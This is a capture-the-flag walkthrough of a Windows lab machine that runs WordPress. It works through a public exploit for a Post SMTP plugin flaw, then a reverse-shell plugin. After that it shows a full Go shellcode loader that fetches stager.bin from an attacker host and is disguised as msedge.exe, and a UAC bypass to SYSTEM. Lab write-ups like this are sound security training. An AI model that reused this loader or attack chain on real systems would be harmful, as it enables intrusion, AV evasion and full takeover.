---
description: >-
  A step-by-step walkthrough of the Subscriber machine on the Ronin66 platform,
  covering the full attack chain from initial reconnaissance to root.
cover: ../.gitbook/assets/subscriber.jpeg
coverY: 0
coverHeight: 237
---

# Subscriber(Windows)

## Initial Enumeration :&#x20;

### NMAP :&#x20;

```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://samurai.local/samurai/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-title: Did not follow redirect to https://samurai.local/samurai/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql         syn-ack ttl 127 MariaDB 10.3.23 or earlier (unauthorized)
5040/tcp  open  unknown       syn-ack ttl 127
7680/tcp  open  pando-pub?    syn-ack ttl 127
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

```

### Port 80(Web Server) :

```
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://samurai.local/samurai/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
```

* Here we do see a web server open so we go ahead and have a look at it

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

* Initially we noticed that this is designed by `wordpress` so this seemed interesting
* There was a `register` option given at the top so we check it

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

* The registration page revealed the version information which could be looked up to see if there's any existing exploits
* We register as a user with `test` and password as `Pass@123` which was a low-priv user.
* Then, We look up if there any existing public exploits for this specific version
* Interestingly, We found an existing exploit and after a bit of research so we now go ahead and exploit it

{% embed url="https://github.com/bsdrip/CVE-2025-24000-exploit" %}

* If the admin username is unknown, enumerate it via the WP REST API:
* ```
  curl -s 'http://samurai.local/wp-json/wp/v2/users' | python3 -m json.tool
  ```

```
┌──(kali㉿kali)-[~/Desktop/ronin66/subscriber/CVE-2025-24000-exploit]
└─$ python3 exploit_cve_2025_24000.py \
  --url http://samurai.local/samurai/ \
  --username test \
  --password Pass@123 \
  --email shogun
/home/kali/Desktop/ronin66/subscriber/CVE-2025-24000-exploit/exploit_cve_2025_24000.py:17: SyntaxWarning: invalid escape sequence '\ '
  )\   (   (   (        ( /( ( /(  ( /(  )\))(        ( /(  ( /(  ( /(  ( /(  ( /(

   (                        )    )     )  (  (            )     )     )     )     )
   )\   (   (   (        ( /( ( /(  ( /(  )\))(        ( /(  ( /(  ( /(  ( /(  ( /(
 (((_)  )\  )\  )\  ___  )(_)))\()) )(_))((_)()\  ___  )(_)) )\()) )\()) )\()) )\())
 )\___ ((_)((_)((_)|___|((_) ((_)\ ((_)   (()((_)|___|((_)  ((_)\ ((_)\ ((_)\ ((_)((/ __|\ \ / / | __|    |_  )/  (_)|_  )   | __|      |_  )| | (_)/  (_)/  (_)/  (_)
 | (__  \ V /  | _|      / /| () |  / /    |__ \       / / |_  _|| () || () || () |
  \___|  \_/   |___|    /___|\__/  /___|   |___/      /___|  |_|  \__/  \__/  \__/
  Post SMTP <= 3.2.0 | Subscriber -> Admin | CVE-2025-24000

[*] Logging in as test...
[+] Logged in successfully as test
[*] Fetching WP REST nonce from wp-admin...
[+] Got nonce: 3ce9fa5a5f
[*] Triggering password reset for: shogun
[+] Password reset triggered.
[*] Fetching email logs...
[+] Got logs response.
[*] Checking 1 email(s) for reset link...

[+] RESET LINK FOUND:
    http://samurai.local/samurai/wp-login.php?login=shogun&key=D336sy3aS8F6slKGiSGn&action=rp&wp_lang=en_US\r\n\r\n

[*] Visit the link above to set a new admin password and take over the site.
```

* We visited the link and reset the password for the user `shogun`
* After this we were able to log in as the user `shogun` in Wordpress login

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

* Since Now we have wordpress admin panel, we can go ahead and utilize the admin privileges to get a shell by adding a plugin and activating it

{% embed url="https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin" %}

* We upload the a wordpress plugin, which is a zip format and then activate and use it

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

## Shell as `subscriber` :

* we tried a reverse shell with `netcat` but it wasn’t stable so we decided to use the Web Terminal Console

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

* Now since our `netcat` wasn’t working well so I decided to use `Adaptix C2`  but there are also different ways to do this but since I was working recently a lot with it I thought to give it a go.
* We started our `Adaptix C2`

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

* Next we set up a listener on port 443

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

* Now since the Windows Defender seemed to be active on this machine and AMSI present which blocked our standard exe Agent so we decided to create a Raw Shellcode which was named as `stager.bin`
* Now we used a Stager written in GO language that points to our Adaptix Shellcode `stager.bin`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nano shell.go  
```

```
//go:build windows

package main

import (
    "io"
    "net/http"
    "syscall"
    "unsafe"
)

var (
    kernel32         = syscall.NewLazyDLL("kernel32.dll")
    procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

func downloadShellcode(url string) ([]byte, error) {
    resp, err := http.Get(url)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    return io.ReadAll(resp.Body)
}

func executeShellcode(shellcode []byte) {
    addr, _, _ := procVirtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    for i := 0; i < len(shellcode); i++ {
        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
    }
    syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
    url := "http://10.8.0.19:8000/stager.bin"
    shellcode, err := downloadShellcode(url)
    if err != nil {
        panic(err)
    }
    executeShellcode(shellcode)
}
```

* We named this as `shell.go` and now we compile it and name it as `msedge.exe`&#x20;

```
┌──(kali㉿kali)-[~/Downloads]
└─$ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui -s -w" -o msedge.exe shell.go
```

* Then we started our python web server and downloaded the `msedge.exe`  (Note: our `stager.bin` and `msedge.exe` was present in the same directory)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Then on the Web terminal console we enter the `curl` command as `iwr` wasn’t working well for us.
* On the Web Terminal We used the below command :

```
curl -O http://10.8.0.19:8000/msedge.exe
```

* Then we executed the `msedge.exe` binary with the web server continuing to host our `stager.bin` and we got a callback on our C2 server as the subscriber user

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

* Now we enter in the console and get our `user.flg` which is the user flag present in the `C:\Users\Public\` directory.

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

## Shell as `System` :&#x20;

* Now for privesc we simply used the same binary `msedge.exe`  but this time we will execute it with the Adaptix BOF extension kit command which is `uacbypass sspi` and with our Python web Server hosting `stager.bin`&#x20;

```
09/08 13:29:11] subscriber [a8b93a98] beacon > uacbybass sspi C:\xampp\htdocs\samurai\wp-admin\msedge.exe
[09/08 13:29:11] [*] Task: UAC Bypass (SSPI Datagram Contexts)
[09/08 13:29:14] [*] Agent called server, sent [10.13 Kb]
[09/08 13:29:14] [+] BOF output

	SspiUacBypass - Bypassing UAC with SSPI Datagram Contexts
	by @splinter_code
Forging a token from a fake Network Authentication through Datagram Contexts
Network Authentication token forged correctly, handle --> 0x5fc
Forged Token Session ID set to 1. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session
Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now
Invoking CreateSvcRpc (by @x86matthew)
Connecting to \\127.0.0.1\pipe\ntsvcs RPC pipe
Opening service manager...
Creating temporary service...
Executing 'C:\xampp\htdocs\samurai\wp-admin\msedge.exe' as SYSTEM user...
Deleting temporary service...
Finished
[09/08 13:29:14] [+] BOF finished

+--- Task [a8b93a98] closed ----------------------------------------------------------+

```

* Here on our `Adaptix C2` we see that we got another callback as the `SYSTEM`

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* Now we go ahead and get our `root.flg` present on `C:\Users\Administrator\Desktop` directory

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

* We now have successfully solved this machine!!
